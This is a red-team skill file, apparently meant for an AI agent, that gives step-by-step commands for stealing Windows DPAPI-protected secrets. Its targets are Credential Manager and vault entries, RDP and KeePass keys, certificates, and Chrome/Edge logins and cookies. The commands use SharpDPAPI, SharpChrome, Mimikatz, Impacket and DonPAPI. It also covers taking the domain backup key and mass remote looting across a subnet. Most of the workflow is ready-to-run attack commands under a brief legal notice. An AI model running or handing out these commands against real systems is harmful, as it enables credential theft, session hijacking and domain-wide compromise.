---
name: abusing-dpapi-for-credential-access
description: Extract and decrypt Windows DPAPI-protected secrets (Credential Manager, browser logins/cookies, Wi-Fi credentials, KeePass keys) online or offline using SharpDPAPI, SharpChrome, Mimikatz, or Impacket's dpapi.py, including domain-wide decryption via the DPAPI backup key. Use when running authorized red-team credential-access engagements after gaining a foothold or triaging DPAPI blobs pulled from a host. Do not use for broad stored-credential harvesting across browsers, databases, and application vaults with LaZagne - use performing-credential-access-with-lazagne.
domain: cybersecurity
subdomain: red-teaming
tags:
- red-team
- credential-access
- dpapi
- sharpdpapi
- post-exploitation
- active-directory
- windows
- mimikatz
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- DE.CM-01
mitre_attack:
- T1555.004
---
# Abusing DPAPI for Credential Access

> **Legal Notice:** This skill is for authorized penetration testing, red-team engagements, and educational purposes only. Extracting credentials from systems you do not own or lack explicit written authorization to test is illegal and may violate computer fraud and abuse laws. Always operate within a signed rules-of-engagement and document every action.

## Overview

The Windows Data Protection API (DPAPI) is the operating system's built-in symmetric-encryption service that applications use to protect secrets at rest: saved RDP and Windows Credential Manager credentials, web and Wi-Fi credentials in the Credential Vault, browser saved logins and cookies (Chrome/Edge), KeePass keys, certificate private keys, and Scheduled Task passwords. DPAPI derives a per-user (or per-machine) **master key** from the user's password (or the machine account secret), and that master key encrypts individual "DPAPI blobs." The encrypted master keys live under `%APPDATA%\Microsoft\Protect\<SID>\` (user) and `%WINDIR%\System32\Microsoft\Protect\` (machine).

Red teamers abuse DPAPI to recover plaintext secrets after gaining a foothold, mapping to MITRE ATT&CK **T1555.004 (Credentials from Password Stores: Windows Credential Manager)**. There are three primary decryption paths:

1. **Online / context-based** — running as the target user, DPAPI APIs (`CryptUnprotectData`) transparently decrypt the user's blobs. SharpDPAPI's `/unprotect` flag uses this.
2. **Offline with the user password or NTLM hash** — decrypt the user's master keys with `/password:` or `/ntlm:`, then decrypt the blobs offline (great for triaged files pulled from a host).
3. **Domain-wide with the DPAPI backup key** — Domain Admins can extract the domain's RSA DPAPI backup key (`.pvk`) once, then decrypt *any* domain user's master keys forever, online or offline, with `/pvk:`.

The canonical tooling is **SharpDPAPI** (GhostPack, a C# port of Mimikatz DPAPI functionality) for Windows, **SharpChrome** for browser secrets, and **Mimikatz** (`dpapi::*`) as the original implementation. On Linux, Impacket's `dpapi.py` and `donpapi` perform remote/offline triage.

## When to Use

- After compromising a Windows host where the user has saved RDP, browser, or vault credentials worth harvesting for lateral movement.
- When you hold a user's password or NTLM hash and want to decrypt their DPAPI-protected secrets offline.
- When you have Domain Admin and want to obtain the domain DPAPI backup key to decrypt any user's protected data across the estate.
- When triaging exfiltrated `Credentials`, `Vault`, or `Protect` directories from disk images.
- During purple-team exercises to validate detection of DPAPI master-key access and LSASS/Protect-folder reads.

## Prerequisites

- An authorized foothold (interactive session, beacon, or remote admin) on the target Windows host.
- Knowledge of the target user's SID, and one of: the user's session, password, NTLM hash, or Domain Admin rights for the backup key.
- Tooling (compile from source or use release binaries; obtain only from official upstreams):

```bash
# SharpDPAPI / SharpChrome (GhostPack) — build with Visual Studio / msbuild
git clone https://github.com/GhostPack/SharpDPAPI.git
# Open SharpDPAPI.sln and build Release, or:
msbuild SharpDPAPI.sln /p:Configuration=Release

# Mimikatz (original DPAPI implementation)
# https://github.com/gentilkiwi/mimikatz/releases

# Linux remote/offline triage (Impacket)
pipx install impacket            # provides dpapi.py / impacket-dpapi
pipx install donpapi             # https://github.com/login-securite/DonPAPI
```

## Objectives

- Triage a host for DPAPI-protected credential, vault, RDP, and certificate blobs.
- Decrypt user master keys online (`/unprotect`), with a password/hash, or with the domain backup key.
- Recover plaintext Credential Manager and Vault secrets.
- Extract browser saved logins and cookies with SharpChrome.
- Obtain and reuse the domain DPAPI backup key for estate-wide decryption.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic | Relevance |
|--------------|------|--------|-----------|
| T1555.004 | Credentials from Password Stores: Windows Credential Manager | Credential Access | DPAPI protects Credential Manager / Vault entries; decrypting master keys and blobs recovers these stored credentials. |
| T1555.003 | Credentials from Password Stores: Credentials from Web Browsers | Credential Access | SharpChrome decrypts DPAPI-protected Chrome/Edge logins, cookies, and state keys. |
| T1003 | OS Credential Dumping | Credential Access | Extracting master keys / backup keys is a form of credential material dumping. |

## Workflow

### 1. Triage the host for DPAPI blobs

Run the SharpDPAPI `triage` command in the user's context to automatically enumerate and (where possible) decrypt credentials, vaults, RDG/RDP, and certificates:

```powershell
# Online triage in the current user's context (uses CryptUnprotectData)
SharpDPAPI.exe triage /unprotect

# Machine triage (requires local admin / SYSTEM) for machine-scoped blobs
SharpDPAPI.exe machinetriage
```

### 2. Decrypt user master keys offline (password or NTLM hash)

If you hold the user's password or hash, decrypt their master keys to a `{GUID}:SHA1` mapping you can reuse against individual blobs:

```powershell
# Decrypt all of the current/specified user's master keys with the password
SharpDPAPI.exe masterkeys /password:CorrectHorseBatteryStaple

# Decrypt master keys with the user's NTLM hash instead of the password
SharpDPAPI.exe masterkeys /ntlm:cc36cf7a8514893efccd332446158b1a

# Output is GUID:SHA1 lines — feed them to credentials/vaults commands
```

### 3. Recover Credential Manager and Vault secrets

Use the decrypted master-key mapping (or `/pvk:`) to decrypt the stored credentials and vault entries:

```powershell
# Decrypt Credential Manager blobs with a GUID:SHA1 mapping
SharpDPAPI.exe credentials {GUID1}:SHA1 {GUID2}:SHA1

# Or point at a target Credentials folder and decrypt with the domain backup key
SharpDPAPI.exe credentials /target:C:\Users\bob\AppData\Local\Microsoft\Credentials\ /pvk:backupkey.pvk

# Decrypt Credential Vault entries
SharpDPAPI.exe vaults /pvk:backupkey.pvk
```

### 4. Decrypt RDP, KeePass, and certificate secrets

```powershell
# Saved RDCMan.settings RDP passwords (current user context)
SharpDPAPI.exe rdg /unprotect

# KeePass DPAPI-protected master keys
SharpDPAPI.exe keepass /unprotect

# Certificate private keys (export usable .pem with /showall for all stores)
SharpDPAPI.exe certificates /unprotect /showall
```

### 5. Extract browser credentials with SharpChrome

SharpChrome decrypts Chrome/Edge logins and cookies. Modern Chromium uses an App-Bound "state key" that SharpChrome resolves via DPAPI:

```powershell
# Decrypt saved logins for the current user
SharpChrome.exe logins /unprotect

# Decrypt cookies (useful for session hijacking) in a target folder
SharpChrome.exe cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies" /pvk:backupkey.pvk

# Resolve the AES state key explicitly
SharpChrome.exe statekeys /unprotect
```

### 6. Obtain the domain DPAPI backup key (Domain Admin)

With Domain Admin, retrieve the domain's RSA DPAPI backup private key once. This key decrypts every domain user's master keys indefinitely:

```powershell
# Pull and save the domain backup key as a .pvk via the MS-BKRP RPC interface
SharpDPAPI.exe backupkey /server:dc01.corp.local /file:backupkey.pvk
```

Then decrypt any user's master keys offline with it:

```powershell
SharpDPAPI.exe masterkeys /pvk:backupkey.pvk /target:C:\Users\alice\AppData\Roaming\Microsoft\Protect\
```

### 7. Remote / Linux-based triage (Impacket / DonPAPI)

From a Linux operator box, harvest and decrypt DPAPI secrets across hosts:

```bash
# Decrypt a single masterkey file with Impacket using the domain backup key
impacket-dpapi masterkey -file <masterkey_file> -pvk backupkey.pvk

# Decrypt a credential blob with the recovered masterkey
impacket-dpapi credential -file <cred_blob> -key 0x<decrypted_masterkey>

# Mass remote DPAPI looting across hosts with DonPAPI
donpapi collect -u alice -p 'Password123!' -d corp.local --target 10.0.0.0/24
```

## Tools and Resources

| Tool | Purpose | Link |
|------|---------|------|
| SharpDPAPI | Windows DPAPI triage/decryption (C#) | https://github.com/GhostPack/SharpDPAPI |
| SharpChrome | Chromium logins/cookies/state-key decryption | https://github.com/GhostPack/SharpDPAPI |
| Mimikatz | Original DPAPI (`dpapi::*`) implementation | https://github.com/gentilkiwi/mimikatz |
| Impacket dpapi.py | Remote/offline DPAPI decryption (Python) | https://github.com/fortra/impacket |
| DonPAPI | Mass remote DPAPI looting | https://github.com/login-securite/DonPAPI |
| HackTricks DPAPI | Technique reference | https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html |

## Detection and OPSEC Notes

- Master-key access and reads of `\Microsoft\Protect\` and `\Microsoft\Credentials\` are detectable; `backupkey` triggers an MS-BKRP RPC call to the DC.
- The `/unprotect` (online) path is the stealthiest single-host option but only works as the live user.
- Defenders should monitor for Sysmon process access to LSASS and abnormal access to Protect/Credentials folders (DE.CM-01).

## Validation Criteria

- [ ] Host triaged with `SharpDPAPI triage` / `machinetriage`.
- [ ] User master keys decrypted via `/unprotect`, `/password:`, `/ntlm:`, or `/pvk:`.
- [ ] Credential Manager and Vault secrets recovered.
- [ ] RDP / KeePass / certificate secrets extracted where present.
- [ ] Browser logins/cookies decrypted with SharpChrome.
- [ ] Domain DPAPI backup key retrieved with Domain Admin (if in scope) and reused offline.
- [ ] All recovered secrets documented with source host/user and ROE adherence confirmed.
